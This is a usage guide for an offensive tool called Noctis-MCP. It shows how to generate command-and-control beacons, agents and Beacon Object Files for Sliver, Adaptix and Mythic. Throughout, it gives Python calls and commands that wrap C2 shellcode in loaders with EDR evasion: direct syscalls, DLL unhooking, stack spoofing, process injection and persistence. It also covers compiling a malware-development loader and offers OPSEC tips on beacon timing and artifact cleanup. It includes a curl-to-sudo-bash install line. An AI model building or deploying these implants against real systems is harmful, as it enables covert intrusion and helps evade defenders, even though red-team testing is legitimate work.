# C2 Integration Guide

Complete guide for integrating Noctis-MCP with C2 frameworks on Linux.

## Overview

Noctis-MCP supports three major C2 frameworks with full Linux cross-compilation support:

| Framework | Protocols | BOF Support | Features | Status |
|-----------|-----------|-------------|----------|--------|
| **Sliver** | HTTPS, DNS, mTLS, TCP | Full | Beacon/Session, extensions, BOF | Production |
| **Adaptix** | HTTPS, HTTP, TCP, Named Pipe | Full | AxScript, crash-safe BOF | Production |
| **Mythic** | HTTPS, HTTP, WebSocket, DNS, SMB | Forge | Multi-agent, BOF/assembly aliases | Production |

---

## Linux Cross-Compilation Support

### System Requirements

**Compilers:**
- MinGW-w64 (x64 and x86) - Windows cross-compilation
- NASM - Assembly compilation
- windres - Resource compilation

**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install mingw-w64 nasm

# Verify
x86_64-w64-mingw32-gcc --version
i686-w64-mingw32-gcc --version
nasm --version
```

### Supported File Types
- `.c`, `.cpp` → MinGW
- `.asm` → NASM
- `.rc` → windres
- Multi-file projects with automatic linking

---

## Sliver C2

### Installation

```bash
# Official installer
curl https://sliver.sh/install | sudo bash

# Verify
sliver-server version
```

### Starting Sliver Server

```bash
# Start server
sliver-server

# Connect with client
sliver-client
```

### Create Listener

```bash
# HTTPS listener
sliver > https --lhost 192.168.1.100 --lport 443

# DNS listener
sliver > dns --domains example.com --lhost 192.168.1.100
```

### Generate Beacon with Noctis

**Python API:**
```python
from c2_adapters import generate_sliver_beacon

result = generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    architecture="x64",
    techniques=["NOCTIS-T004", "NOCTIS-T002"],  # Hell's Gate + AES
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

### Sliver BOF Generation

**Generate BOF from Technique:**
```python
from c2_adapters import SliverAdapter, SliverConfig

config = SliverConfig(
    listener_host="192.168.1.100",
    listener_port=443
)

adapter = SliverAdapter(config, verbose=True)

# Generate Sliver BOF extension
bof_result = adapter.generate_bof('NOCTIS-T004')  # Hell's Gate syscalls

if bof_result.success:
    print(f"x86 BOF: {bof_result.x86_path}")
    print(f"x64 BOF: {bof_result.x64_path}")
    print(f"extension.json: {bof_result.extension_json}")
```

**Load BOF in Sliver:**
```bash
# Load extension
sliver > extensions load /path/to/bof_output/

# Execute BOF
sliver > noctis_syscalls [args]
```

### Sliver Configuration

```python
from c2_adapters.config import SliverConfig, Protocol, Architecture

config = SliverConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol=Protocol.HTTPS,
    architecture=Architecture.X64,

    # Beacon settings
    sleep_time=60,
    jitter=30,

    # Output format
    output_format=OutputFormat.SHELLCODE,

    # Noctis techniques
    techniques=["NOCTIS-T004", "NOCTIS-T002", "NOCTIS-T005"]
)
```

---

## Adaptix C2

### Installation

Follow Adaptix documentation: https://adaptix-framework.gitbook.io

### Starting Adaptix Server

```bash
# Start Adaptix server (refer to official docs)
./adaptix-server start
```

### Generate Beacon with Noctis

**Python API:**
```python
from c2_adapters import generate_adaptix_beacon

result = generate_adaptix_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    architecture="x64",
    techniques=["NOCTIS-T004"],  # Hell's Gate
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

### Adaptix BOF (AxScript Extensions)

**Generate AxScript BOF:**
```python
from c2_adapters import AdaptixAdapter, AdaptixConfig
from compilation.bof_compiler import BOFCompiler

# Compile BOF
bof_compiler = BOFCompiler()
bof_result = bof_compiler.compile_technique_to_bof('NOCTIS-T004', 'adaptix')

# Create Adaptix adapter
config = AdaptixConfig(listener_host="192.168.1.100", listener_port=443)
adapter = AdaptixAdapter(config, verbose=True)

# Generate AxScript extension
axscript_path = adapter.generate_axscript_extension(
    bof_name="syscalls_bof",
    bof_x86_path=bof_result.x86_path,
    bof_x64_path=bof_result.x64_path,
    description="Hell's Gate Syscalls BOF"
)

print(f"AxScript: {axscript_path}")
```

**Generated AxScript Example:**
```javascript
// syscalls_bof.axs - Noctis-MCP Generated Extension
var metadata = {
    name: "syscalls_bof",
    description: "Hell's Gate Syscalls BOF",
    store: true
};

function syscalls_bof(id, cmdline, args) {
    // Get BOF path using Adaptix ax.script_dir() and ax.arch()
    let bof_path = ax.script_dir() + "_bin/syscalls_bof." + ax.arch(id) + ".o";

    // Pack arguments per Adaptix spec (if args provided)
    let bof_params = "";
    if (args && args.length > 0) {
        bof_params = ax.bof_pack("cstr", args);  // arg format: "cstr", "int", etc.
    }

    // Execute BOF using execute_alias per Adaptix pattern
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`);
}

// Register command
ax.registerCommand("syscalls_bof", syscalls_bof);
```

### Adaptix BOF Features

- **Position-Independent Code** - Crash-safe execution
- **Single-Threaded** - Reliable BOF execution
- **AxScript Integration** - Easy command registration
- **Argument Packing** - `ax.bof_pack()` for argument marshalling

---

## Mythic C2

### Installation

```bash
# Clone repository
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install Docker
sudo ./install_docker_ubuntu.sh

# Start Mythic
sudo ./mythic-cli start

# Install Forge (for BOF support)
sudo ./mythic-cli install github https://github.com/MythicAgents/forge.git

# Access UI: https://127.0.0.1:7443
```

### Get API Token

```bash
# Login to Mythic UI: https://127.0.0.1:7443
# Navigate to: Settings → API Tokens → Generate New Token
# Copy token for Noctis-MCP
```

### Generate Agent with Noctis

**Python API:**
```python
from c2_adapters import generate_mythic_agent

result = generate_mythic_agent(
    listener_host="192.168.1.100",
    listener_port=80,
    api_token="your_api_token_here",
    agent_type="apollo",  # or "athena", "poseidon", "merlin"
    c2_profile="http",
    architecture="x64",
    techniques=["NOCTIS-T004"],
    obfuscate=True
)

print(f"Agent: {result.beacon_path}")
print(f"OPSEC Score: {result.opsec_score}/10")
```

### Mythic Forge Integration

**What is Forge?**
Forge is a "Command Augmentation" payload type for Mythic that:
- Doesn't deploy to targets directly
- Provides alias commands that route to Apollo/Athena agents
- Executes BOF and .NET assemblies via agent commands
- Example: `forge_bof_*` → `apollo.execute_bof`

**Supported Agents:**
- Apollo (C#/.NET) - Full support
- Athena (C#) - Full support

**Generate Forge BOF:**
```python
from c2_adapters import MythicAdapter, MythicConfig

config = MythicConfig(
    listener_host="192.168.1.100",
    listener_port=80,
    api_key="your_api_token",
    payload_type="apollo",
    c2_profile="http"
)

adapter = MythicAdapter(config, verbose=True)

# Generate Forge BOF command for a Noctis technique
forge_config = adapter.generate_forge_bof('NOCTIS-T004', target_agent='apollo')

if forge_config['success']:
    print(f"Forge command: {forge_config['command']}")
    print(f"Routes to: {forge_config['routing']}")
    print(f"x86 BOF: {forge_config['x86_bof']}")
    print(f"x64 BOF: {forge_config['x64_bof']}")
    print(f"Usage: {forge_config['usage']}")
```

**Example Output:**
```
Forge command: forge_bof_noctis_004
Routes to: forge_bof_noctis_004 → apollo.execute_bof
x86 BOF: bof_output/noctis_syscalls_x86.o
x64 BOF: bof_output/noctis_syscalls_x64.o
Usage: forge_bof_noctis_004 <session_id> [args]
```

**Forge Usage in Mythic:**
```bash
# In Mythic agent console
forge_bof_noctis_004 [args]

# Or via Forge support for dynamic registration
forge_support apollo
```

**Requirements:**
- Forge payload type installed in Mythic
- Apollo or Athena agent deployed on target
- BOF files (.o) available to Forge

### Mythic Agent Types

**Apollo (C#/.NET):**
- Windows agent
- Full Forge support
- BOF and .NET assembly execution
- Recommended for Windows

**Athena (C#):**
- Windows agent
- Forge support
- Modern codebase
- Alternative to Apollo

**Poseidon (Golang):**
- Cross-platform
- No Forge support (Go-based)
- Good portability

---

## BOF (Beacon Object Files)

### What are BOFs?

Beacon Object Files are position-independent code modules that:
- Execute directly in beacon memory
- Don't touch disk
- Extend beacon capabilities dynamically
- Compatible with multiple C2 frameworks

### BOF Compilation

**Compile Technique to BOF:**
```python
from compilation.bof_compiler import BOFCompiler

compiler = BOFCompiler(output_dir="bof_output")

# Compile any Noctis technique to BOF
result = compiler.compile_technique_to_bof('NOCTIS-T004', c2_framework='sliver')

if result.success:
    print(f"x86 BOF: {result.x86_path}")
    print(f"x64 BOF: {result.x64_path}")
    print(f"extension.json: {result.extension_json}")
```

### BOF Templates

**Available Templates:**
- `templates/bof/base_bof.c` - Minimal template
- `templates/bof/syscall_bof.c` - Syscall-based BOF
- `templates/bof/injection_bof.c` - Process injection
- `templates/bof/enum_bof.c` - System enumeration

**Custom BOF Example:**
```c
#include <windows.h>

DECLSPEC_IMPORT void BeaconPrintf(int type, char* fmt, ...);

void go(char* args, int length) {
    BeaconPrintf(0, "[*] Custom BOF execution");

    // Your code here

    BeaconPrintf(0, "[+] Complete");
}
```

**Compile Custom BOF:**
```python
from compilation.bof_compiler import BOFCompiler

bof_code = open('custom_bof.c').read()

compiler = BOFCompiler()
result = compiler.compile_bof(bof_code, "custom_bof", c2_framework="sliver")
```

### BOF for Each Framework

| Framework | Format | Entry Point | Loading |
|-----------|--------|-------------|---------|
| **Sliver** | COFF (.o) | `go()` | `extensions load` |
| **Adaptix** | COFF (.o) | `go()` | AxScript + `ax.execute_bof()` |
| **Mythic Forge** | COFF (.o) | `go()` | `forge_bof_*` commands |
| **Cobalt Strike** | COFF (.o) | `go()` | `beacon_inline_execute()` |

---

## Multi-File Project Compilation

### Compile Complex Projects

**Example: MaldevAcademy Loader1**
```python
from compilation.linux_compiler import LinuxCompiler

compiler = LinuxCompiler(output_dir="compiled")

result = compiler.compile_project(
    c_files=[
        'Examples/MaldevAcademy/Loader1/.../main.c',
        'Examples/MaldevAcademy/Loader1/.../HellsHall.c',
        'Examples/MaldevAcademy/Loader1/.../Common.c',
        'Examples/MaldevAcademy/Loader1/.../CtAes.c',
        'Examples/MaldevAcademy/Loader1/.../Inject.c'
    ],
    asm_files=[
        'Examples/MaldevAcademy/Loader1/.../HellsAsm.asm'
    ],
    rc_files=[
        'Examples/MaldevAcademy/Loader1/.../Resource.rc'
    ],
    architecture='x64',
    optimization='O2',
    output_name='advanced_loader'
)

if result.success:
    print(f"Binary: {result.binary_path}")
    print(f"Size: {result.metadata['binary_size']:,} bytes")
    print(f"Compilation time: {result.compilation_time:.2f}s")
```

### File Type Support

**C/C++ Files:**
- Compiled with MinGW (`x86_64-w64-mingw32-gcc`)
- Flags: `-O2`, `-static`, `-s`, `-ffunction-sections`

**Assembly Files:**
- Compiled with NASM (`nasm -f win64`)
- Generates COFF object files

**Resource Files:**
- Compiled with windres (`x86_64-w64-mingw32-windres`)
- Embeds resources into PE

---

## Technique Integration

### Load Techniques into C2 Payloads

**How It Works:**
1. TechniqueManager loads metadata from `techniques/metadata/*.json`
2. Source files extracted from `Examples/` directory
3. Code injected into C2 loader template
4. Obfuscation applied (strings, APIs, CFG)
5. Compilation with MinGW + NASM + windres

**Example:**
```python
from c2_adapters import ShellcodeWrapper, WrapperConfig

# C2 shellcode from Sliver/Adaptix/Mythic
shellcode = b'\x90' * 1024

# Configure wrapper with techniques
wrapper_config = WrapperConfig(
    encrypt_strings=True,
    hash_apis=True,
    flatten_control_flow=True,
    techniques=['NOCTIS-T004', 'NOCTIS-T002', 'NOCTIS-T005'],
    loader_type="process_injection",
    shellcode_encryption="aes256"
)

wrapper = ShellcodeWrapper(wrapper_config, verbose=True)

# Wrap shellcode with techniques
result = wrapper.wrap_shellcode(shellcode, output_path="c2_loader.c")

print(f"Wrapped payload: {result['output_path']}")
print(f"OPSEC score: {result['opsec_score']}/10")
print(f"Techniques applied: {result['techniques_applied']}")
```

### Available Techniques

| ID | Name | Category | OPSEC Score |
|----|------|----------|-------------|
| NOCTIS-T001 | Steganography (PNG) | Stealth | 9.0 |
| NOCTIS-T002 | AES Encryption | Encryption | 8.5 |
| NOCTIS-T003 | API Hashing | Obfuscation | 8.0 |
| NOCTIS-T004 | Hell's Gate Syscalls | Evasion | 9.0 |
| NOCTIS-T005 | DLL Unhooking | Evasion | 9.5 |
| NOCTIS-T006 | Stack Spoofing | Evasion | 10.0 |
| NOCTIS-T007 | VEH Unhooking | Evasion | 9.5 |
| NOCTIS-T008 | GPU Evasion | Evasion | 8.5 |
| NOCTIS-T009 | Process Injection | Injection | 7.5 |
| NOCTIS-T010 | Registry Persistence | Persistence | 4.0 |

---

## Comparison Matrix

| Feature | Sliver | Adaptix | Mythic |
|---------|--------|---------|--------|
| **Platform** | Cross-platform | Windows | Cross-platform |
| **Language** | Go | C/C++ | Python/Docker |
| **Protocols** | 5 | 4 | 5 |
| **BOF Support** | Extensions | AxScript | Forge |
| **Linux Cross-Compile** | Yes | Yes | Yes |
| **OPSEC Features** | Good | Excellent | Good |
| **Setup Difficulty** | Easy | Medium | Medium |
| **Best For** | General purpose | Windows red teams | Enterprise ops |

---

## Best Practices

### OPSEC Checklist
- Use HTTPS/mTLS for encryption
- Enable Noctis obfuscation
- Set reasonable beacon intervals (5-60min)
- Use redirectors/CDN
- Test in isolated environment first
- Monitor for anomalies
- Clean up artifacts after ops

### Beacon Intervals

| Scenario | Interval | Jitter |
|----------|----------|--------|
| **Active Op** | 5-30s | 20% |
| **Persistence** | 5-60m | 50% |
| **Stealth** | 1-24h | 80% |

---

## Resources

### Sliver
- **Site**: https://sliver.sh
- **GitHub**: https://github.com/BishopFox/sliver
- **BOF Guide**: https://www.redteaming.org/sliverbof.html

### Adaptix
- **Docs**: https://adaptix-framework.gitbook.io
- **BOF Guide**: https://adaptix-framework.gitbook.io/adaptix-c2/bof-and-extensions

### Mythic
- **GitHub**: https://github.com/its-a-feature/Mythic
- **Forge**: https://github.com/MythicAgents/forge
- **Docs**: https://docs.mythic-c2.net

---

**Last Updated**: October 6, 2025
**Version**: 2.0.0 - Linux BOF Support
